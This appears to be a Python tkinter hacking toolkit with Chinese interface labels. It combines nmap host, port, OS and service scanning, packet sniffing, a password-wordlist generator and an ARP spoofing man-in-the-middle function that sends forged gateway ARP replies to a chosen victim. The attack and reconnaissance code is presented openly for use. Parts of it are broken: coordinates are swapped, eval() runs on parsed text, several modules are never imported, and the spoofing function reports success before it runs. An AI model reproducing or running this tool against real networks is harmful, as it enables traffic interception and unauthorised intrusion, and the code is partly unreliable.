#!/usr/bin/env python
# -*- coding: utf-8 -*-
from tkinter import *
import geoip2.database
import json
import requests
import nmap
from scapy.all import *
lock = threading.Lock()
openNum = 0
threads = []
LOG_LINE_NUM = 0
class MY_GUI():
    counter = 0
    def __init__(self,init_window_name):
        self.init_window_name = init_window_name
    #设置窗口
    def set_init_window(self):
        # 加载数据库（官网上免费数据库），数据库文件在根目录
        #self.reader = geoip2.database.Reader('GeoLite2-City.mmdb')
        #self.rs_btn = tkinter.Button(self.root, command=self.find_position, text='查询')
        self.init_window_name.title("YYDS工具_v1.0")           #窗口名
        #self.init_window_name.geometry('320x160+10+10')                         #290 160为窗口大小，+10 +10 定义窗口弹出时的默认展示位置
        self.init_window_name.geometry('1080x1080+10+10')
        #self.init_window_name["bg"] = "blue"                                    #窗口背景色，
        self.init_window_name.attributes("-alpha",0.9)                          #虚化，值越小虚化程度越高
        #菜单栏
        menubox =Menu(self.init_window_name)
        menubox1 = Menu(menubox)
        menubox2 = Menu(menubox)
        menubox3 = Menu(menubox)
        menubox.add_cascade(label='主页', menu=menubox3)
        menubox3.add_command(label='清除文本框内容', command=self.clear)
        menubox3.add_command(label='退出', command=self.ex)
        #menubox.add_cascade(label='菜单', menu=menubox) # 子菜单绑定到顶级菜单
        menubox.add_cascade(label='嗅探与攻击', menu=menubox1)
        menubox.add_cascade(label='数据分析', menu=menubox2)
        menubox1.add_command(label='字典生成',command=self.create_window)
        menubox1.add_command(label='网络嗅探', command=self.create_window1)
        menubox1.add_command(label='ARP中间人攻击', command=self.create_window2)
        #menubox1.add_command(label='ftp攻击（弱口令）', command=self.create_window2)
        menubox2.add_command(label='查询真实ip地址', command=self.map)
        menubox2.add_command(label='获取源目的和目的硬件，源ip，目的地址', command=self.create_window3)
        self.init_window_name.config(menu=menubox)  # 加上这代码，才能将菜单栏显示
        #标签
        self.init_data_label = Label(self.init_window_name, text="请输入相关查询信息，进行查询")
        self.init_data_label.grid(row=0, column=0)
        self.result_data_label = Label(self.init_window_name, text="输出结果")
        self.result_data_label.grid(row=0, column=10)
        self.log_label = Label(self. init_window_name, text="日志")
        self.log_label.grid(row=9, column=0)
        #文本框
        self.init_data_Text = Entry(self.init_window_name, width=50)  #原始数据录入框
        self.init_data_Text.grid(row=0, column=0, rowspan=4, columnspan=1)
        self.result_data_Text = Text(self.init_window_name, width=100, height=60)  #处理结果展示
        self.result_data_Text.grid(row=1, column=10, rowspan=15, columnspan=10)
        self.log_data_Text = Text(self.init_window_name, width=66, height=9)  # 日志框
        self.log_data_Text.grid(row=10, column=0, columnspan=10)
        #按钮
         # 调用内部方法  加()为直接调用
        self.arp_button = Button(self.init_window_name, text="1.查询主机是否存活", bg="lightblue",height=1, width=20,command=self.arp)
        self.arp_button.grid(row=4, column=0, rowspan=1, columnspan=1)
        self.portScanners_button = Button(self.init_window_name, text="2.扫描常用端口", bg="lightblue", height=1, width=20, command=self.portScanners)
        self.portScanners_button.grid(row=5, column=0, rowspan=1, columnspan=1)
        self.systems_button = Button(self.init_window_name, text="3.系统扫描", bg="lightblue", height=1, width=20,command=self.systems)
        self.systems_button.grid(row=6, column=0, rowspan=1, columnspan=1)
        self.server_button = Button(self.init_window_name, text="4.服务与版本扫描", bg="lightblue", height=1, width=20,command=self.server)
        self.server_button.grid(row=7, column=0, rowspan=1, columnspan=1)
        self.server_button = Button(self.init_window_name, text="5.whois查询", bg="lightblue", height=1, width=20,command=self.yuming)
        self.server_button.grid(row=8, column=0, rowspan=1, columnspan=1)
        #self.server_button = Button(self.init_window_name, text="4.服务与版本扫描", bg="lightblue", height=1, width=20,
                                    #command=self.find_position)
        #self.server_button.grid(row=9, column=0, rowspan=1, columnspan=1)

    #功能函数
    #server
    def ex(self):
        exit(0)
    def clear(self):
        self.result_data_Text.delete(1.0,END)
    def server(self):

        s1 = self.init_data_Text.get()
        slist = s1.split(",")
        target = slist[0]
        port = slist[1]
        nm = nmap.PortScanner()
        nm.scan(target, port, "-sV")
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                self.result_data_Text.insert(1.0,'Protocol : {0}\n'.format(proto))
                lport = list(nm[host][proto].keys())
                lport.sort()
                for port in lport:
                    self.result_data_Text.insert(1.0,'port : %s\nproduct : %s\nversion : %s\n' % (port, nm[host][proto][port]['product'], nm[host][proto][port]['version']))
        self.write_log_to_Text("服务与版本扫描成功")
    #system
    def systems(self):

        s= self.init_data_Text.get()
        slist=s.split(",")
        target = slist[0]
        port = slist[1]
        nm = nmap.PortScanner()
        nm.scan(target, port, '-O')
        if 'osmatch' in nm[target]:
            for osmatch in nm[target]['osmatch']:
                self.result_data_Text.insert(1.0,'OsMatch.name : {0}\n'.format(osmatch['name']))
                self.result_data_Text.insert(1.0,'OsMatch.accurary : {0}\n'.format(osmatch['accuracy']))
                self.result_data_Text.insert(1.0,'OsMatch.line : {0}\n'.format(osmatch['accuracy']))
                if 'osclass' in osmatch:
                    for osclass in osmatch['osclass']:
                        self.result_data_Text.insert(1.0,'OsClass.type : {0}\n'.format(osclass['type']))
                        self.result_data_Text.insert(1.0,'OsClass.vendor : {0}\n'.format(osclass['vendor']))
                        self.result_data_Text.insert(1.0,'OsClass.osfamily : {0}\n'.format(osclass['osfamily']))
                        self.result_data_Text.insert(1.0,'OsClass.osgen : {0}\n'.format(osclass['osgen']))
                        self.result_data_Text.insert(1.0,'OsClass.accuracy : {0}\n'.format(osclass['accuracy']))
        self.write_log_to_Text("查询系统版本信息成功")


    def arp(self):
        src = self.init_data_Text.get()
        nm = nmap.PortScanner()
        nm.scan(src,arguments='-sT')
        for host in nm.all_hosts():
            self.write_log_to_Text("查询主机成功")
            self.result_data_Text.insert(1.0, 'Host :%s %s\n'%(host, nm[host].hostname()))
            self.result_data_Text.insert(1.0, 'State: %s\n'%(nm[host].state()))

    def yuming(self):
        s = self.init_data_Text.get()
        url = 'https://api.devopsclub.cn/api/whoisquery?domain=' + s + '&type=json&standard=true'
        head = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        req = requests.get(url, head)
        # req = urllib.request.Request(url)
        content = json.loads(req.text)
        if (content):
            email = []
            phone = []
            dnsNameServers = []
            domainNames = []
            domainStatuss = []
            expirationTimes = []
            registras = []
            registrationTimes = []
            updatedDates = []
            # 注册人邮箱
            email.append(content['data']['data']['contactEmail'])
            # 注册人电话
            phone.append(content['data']['data']['contactPhone'])
            # DNS服务器
            dnsNameServers.append(content['data']['data']['dnsNameServer'])
            # 域名
            domainNames.append(content['data']['data']['domainName'])
            # 域名状态
            domainStatuss.append(content['data']['data']['domainStatus'])
            # 到期日期
            expirationTimes.append(content['data']['data']['expirationTime'])
            # 注册商
            registras.append(content['data']['data']['registrar'])
            # 注册日期
            registrationTimes.append(content['data']['data']['registrationTime'])
            # 更新日期
            updatedDates.append(content['data']['data']['updatedDate'])
            for i in range(len(updatedDates)):
                self.result_data_Text.insert(1.0,updatedDates[i],'更新日期')
            self.result_data_Text.insert(1.0, '\n')
            for i in range(len(registrationTimes)):
                self.result_data_Text.insert(1.0,registrationTimes[i])
            self.result_data_Text.insert(1.0, '\n')
            for i in range(len(registras)):
                self.result_data_Text.insert(1.0,registras[i])
            self.result_data_Text.insert(1.0, '\n')
            for i in range(len(expirationTimes)):
                self.result_data_Text.insert(1.0,expirationTimes[i])
            self.result_data_Text.insert(1.0, '\n')
            for i in range(len(domainStatuss[0])):
                self.result_data_Text.insert(1.0,domainStatuss[0][i])
                self.result_data_Text.insert(1.0, '\n')
            for i in range(len(domainNames)):
                self.result_data_Text.insert(1.0,domainNames[i])
            self.result_data_Text.insert(1.0, '\n')
            for i in range(len(dnsNameServers[0])):
                self.result_data_Text.insert(1.0,dnsNameServers[0][i])
                self.result_data_Text.insert(1.0, '\n')
            for i in range(len(phone)):
                self.result_data_Text.insert(1.0,phone[i])
            self.result_data_Text.insert(1.0, '\n')
            for i in range(len(email)):
                self.result_data_Text.insert(1.0,email[i])
        self.write_log_to_Text("whois查询成功")

    def portScanners(self):
        #s = self.init_data_Text.get()
        #slist = s.split(",")
        #target = slist[0]

        #port = slist[1]
        target = self.init_data_Text.get()
        nm = nmap.PortScanner()
        for i in [80, 8080, 3128, 3389, 3306, 8081, 9098, 1080, 21, 23, 22, 53, 139, 445]:
            port = str(i)

            nm.scan(target, port)
            for host in nm.all_hosts():
                self.result_data_Text.insert(1.0,'-------------------------------\n')
                self.result_data_Text.insert(1.0,'Host :{0} ({1})\n'.format(host, nm[host].hostname()))
                self.result_data_Text.insert(1.0,'State: {0}\n'.format(nm[host].state()))
                for proto in nm[host].all_protocols():
                    self.result_data_Text.insert(1.0,'protocol :{0}\n'.format(proto))
                    lport = list(nm[host][proto].keys())
                    lport.sort()
                    for port in lport:
                        self.result_data_Text.insert(1.0,'port : {0} \nstata :{1}\n'.format(port, nm[host][proto][port]['state']))
        self.write_log_to_Text("扫描主机常用端口成功")

    def sniff1(self):
        s = self.init_data_Text.get()
        slist = s.split(",")
        ip = slist[0]
        a = slist[1]
        packets = sniff(filter="host " + ip, count=5)
        wireshark(packets)
        wrpcap(a, packets)
        self.result_data_Text.insert(1.0,packets)
    def ip_fenxi(self):
        s= self.init_data_Text.get()
        slist = s.split(",")
        count = int(slist[0])
        a1= slist[1]
        packet = sniff(count)
        wrpcap(a1, packet)
        pcaps = rdpcap(a1)
        print(len(pcaps))
        for pkt in pcaps:
            self.result_data_Text.insert(1.0,'源目的地址：'+pkt[Ether].src)
            self.result_data_Text.insert(1.0,'目的硬件地址：'+pkt[Ether].dst)
            self.result_data_Text.insert(1.0,'源ip地址'+pkt[IP].src)
            self.result_data_Text.insert(1.0,'目的ip地址'+pkt[IP].dst)
            self.result_data_Text.insert(1.0,'\n')
        self.write_log_to_Text("获取源目的地址和目的硬件地址，源ip地址，目的地址成功")
    def zidian(self):
        s = self.init_data_Text.get()
        slist = s.split(",")
        s1 = int(slist[0])
        words = slist[1]
        a=slist[2]
        temp = itertools.permutations(words, s1)

        passworld = open(a, 'a')
        for i in temp:
            passworld.write(''.join(i))
            passworld.write(''.join(" "))
        passworld.close()
        f = open(a, "r")  # 设置文件对象
        d = f.read()  # 将txt文件的所有内容读入到字符串str中
        f.close()  # 将文件关闭
        self.result_data_Text.insert(1.0,'%s' %(d))
        self.write_log_to_Text("生成字典成功")
    def ARP1(self):
        self.write_log_to_Text("ARP中间人攻击成功")
        def getselfMac():
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])

        def arpspoof(self):
            s=0
            s2 = self.init_data_Text.get()
            slist = s2.split(",")
            gwIP = slist[0]
            misleadingIP = slist[1]
            mlmac = getmacbyip(misleadingIP)
            eth = Ether(dst=mlmac)
            arp = ARP(op=2, hwsrc=getselfMac(), psrc=gwIP, hwdst=mlmac, pdst=misleadingIP)  #
            while s < 10:
                sendp(eth / arp, inter=2, loop=0)
                s+=1

        arpspoof(self)

    def map(self):

        self.gi = geoip2.database.Reader('GeoLite2-City.mmdb')
        # 创建主窗口,用于容纳其它组件
        t4 = Toplevel(self.init_window_name)
        t4.geometry('800x800+10+10')
        self.init_data_label = Label(t4, text="请输入 ip查询信息")
        self.init_data_label.grid(row=0, column=0)
        self.init_data_Text = Entry(t4, width=100)  # 原始数据录入框
        self.init_data_Text.grid(row=10, column=0, rowspan=3, columnspan=1)
        self.server_button = Button(t4, text="start", bg="lightblue", height=1, width=20,command=self.find_position)
        self.server_button.grid(row=20, column=0, rowspan=1, columnspan=1)

        self.result_data_label = Label(t4, text="查询信息如下")
        self.result_data_label.grid(row=30, column=0)
        self.result_data_Text = Text(t4, width=100, height=20)  # 处理结果展示
        self.result_data_Text.grid(row=40, column=0, rowspan=1, columnspan=10)
        self.log_label = Label(t4, text="日志")
        self.log_label.grid(row=50, column=0)
        self.log_data_Text = Text(t4, width=100, height=10)  # 日志框
        self.log_data_Text.grid(row=60, column=0, columnspan=10)


    # 完成布局
    def gui_arrang(self):
        self.init_data_Text.pack()
        self.result_data_Text.pack()
        self.server_button.pack()
    # 根据ip查找地理位置
    def find_position(self):

        self.write_log_to_Text("获取真实ip地址信息成功")

        # 获取输入信息
        self.ip_addr = self.init_data_Text.get()

            #self.init_data_Text.get(1.0,END).strip().replace("\n","").encode()
        aim_ = self.gi.city(self.ip_addr)
        temp = str(aim_)
        tr = temp.split('(')[1]
        info = tr.split(', [')[0]
        aim = eval(info)

        # 为了避免非法值,导致程序崩溃,有兴趣可以用正则写一下具体的规则,我为了便于新手理解,减少代码量,就直接粗放的过滤了
        # try:
        # 获取目标城市
        if 'city' in aim:
            city = aim['city']['names']['en']
        else:
            city = aim['country']['names']['en']
        # 获取目标国家
        country = aim['country']['names']['en']
        # 获取目标地区
        region_code = aim['continent']['names']['en']
        # 获取目标经度
        longitude = aim['location']['latitude']
        # 获取目标纬度
        latitude = aim['location']['longitude']

        # 创建临时列表
        the_ip_info = ['所在纬度:' + str(latitude), '所在经度:' + str(longitude), '所在地域:' + str(region_code),
                       '所在城市:' + str(city), '所在国家:' + str(country), '需要查询的ip:' + str(self.ip_addr)]
        # 清空回显列表可见部分,类似clear命令
        for item in range(10):
            self.result_data_Text.insert(1.0, '''''')

        # 为回显列表赋值
        for item in the_ip_info:
            self.result_data_Text.insert(1.0, item)
            self.result_data_Text.insert(1.0,'\n')

    #获取当前时间
    def get_current_time(self):
        current_time = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        return current_time
    #日志动态打印
    def write_log_to_Text(self,logmsg):
        global LOG_LINE_NUM
        current_time = self.get_current_time()
        logmsg_in = str(current_time) +" " + str(logmsg) + "\n"      #换行
        if LOG_LINE_NUM <= 7:
            self.log_data_Text.insert(END, logmsg_in)
            LOG_LINE_NUM = LOG_LINE_NUM + 1
        else:
            self.log_data_Text.delete(1.0,2.0)
            self.log_data_Text.insert(END, logmsg_in)

    def create_window(self):
        t = Toplevel(self.init_window_name)
        t.geometry('800x800+20+20')
        t.title('字典生成')
        self.init_data_label = Label(t, text="请输入相关查询信息，进行查询")
        self.init_data_label.grid(row=3, column=0)
        self.result_data_label = Label(t, text="输出结果")
        self.result_data_label.grid(row=40, column=0)
        self.init_data_Text = Entry(t, width=100)  #原始数据录入框
        self.init_data_Text.grid(row=10, column=0, rowspan=3, columnspan=1)
        self.result_data_Text = Text(t, width=100, height=20)  #处理结果展示
        self.result_data_Text.grid(row=60, column=0, rowspan=1, columnspan=10)
        self.log_data_Text = Text(t, width=100, height=10)  # 日志框
        self.log_data_Text.grid(row=150, column=0, columnspan=10)
        self.arp_button = Button(t, text="点击按钮生成字典", bg="lightblue",height=1, width=15,command=self.zidian)
        self.arp_button.grid(row=30, column=0, rowspan=1, columnspan=1)
        self.log_label = Label(t, text="日志")
        self.log_label.grid(row=200, column=0)
    def create_window1(self):
        t1 = Toplevel(self.init_window_name)
        t1.geometry('800x800+10+10')
        t1.title('网络嗅探')
        self.init_data_label = Label(t1, text="请输入ip进行网络嗅探")
        self.init_data_label.grid(row=3, column=0)
        self.result_data_label = Label(t1, text="网络嗅探结果")
        self.result_data_label.grid(row=40, column=0)
        self.init_data_Text = Entry(t1, width=100)  #原始数据录入框
        self.init_data_Text.grid(row=10, column=0, rowspan=3, columnspan=1)
        self.result_data_Text = Text(t1, width=100, height=20)  #处理结果展示
        self.result_data_Text.grid(row=50, column=0, rowspan=1, columnspan=10)
        self.log_data_Text = Text(t1, width=100, height=10)  # 日志框
        self.log_data_Text.grid(row=80, column=0, columnspan=10)
        self.arp_button = Button(t1, text="确认", bg="lightblue",height=1, width=15,command=self.sniff1)
        self.arp_button.grid(row=30, column=0, rowspan=1, columnspan=1)
        self.log_label = Label(t1, text="日志")
        self.log_label.grid(row=60, column=0)
    def create_window2(self):
        t2 = Toplevel(self.init_window_name)
        t2.geometry('800x800+10+10')
        t2.title('ARP中间人攻击')
        self.init_data_label = Label(t2, text="请输入 ip,ip  格式ARP中间人攻击")
        self.init_data_label.grid(row=3, column=0)
        self.init_data_Text = Entry(t2, width=100)  #原始数据录入框
        self.init_data_Text.grid(row=10, column=0, rowspan=3, columnspan=1)
        self.log_data_Text = Text(t2, width=100, height=10)  # 日志框
        self.log_data_Text.grid(row=80, column=0, columnspan=10)
        self.arp_button = Button(t2, text="确认", bg="lightblue",height=1, width=15,command=self.ARP1)
        self.arp_button.grid(row=30, column=0, rowspan=1, columnspan=1)
        self.log_label = Label(t2, text="日志")
        self.log_label.grid(row=60, column=0)
    def create_window3(self):
        t3 = Toplevel(self.init_window_name)
        t3.geometry('800x800+10+10')
        t3.title('数据包获取地址')
        self.init_data_label = Label(t3, text="请输入数据包的个数（数字）")
        self.init_data_label.grid(row=3, column=0)
        self.result_data_label = Label(t3, text="数据包获取地址结果")
        self.result_data_label.grid(row=40, column=0)
        self.init_data_Text = Entry(t3, width=100)  #原始数据录入框
        self.init_data_Text.grid(row=10, column=0, rowspan=3, columnspan=1)
        self.result_data_Text = Text(t3, width=100, height=20)  #处理结果展示
        self.result_data_Text.grid(row=50, column=0, rowspan=1, columnspan=10)
        self.log_data_Text = Text(t3, width=100, height=10)  # 日志框
        self.log_data_Text.grid(row=80, column=0, columnspan=10)
        self.arp_button = Button(t3, text="确认", bg="lightblue",height=1, width=15,command=self.ip_fenxi)
        self.arp_button.grid(row=30, column=0, rowspan=1, columnspan=1)
        self.log_label = Label(t3, text="日志")
        self.log_label.grid(row=60, column=0)

def gui_start():
    init_window = Tk()              #实例化出一个父窗口
    ZMJ_PORTAL = MY_GUI(init_window)
    # 设置根窗口默认属性
    ZMJ_PORTAL.set_init_window()

    init_window.mainloop()          #父窗口进入事件循环，可以理解为保持窗口运行，否则界面不展示
gui_start()

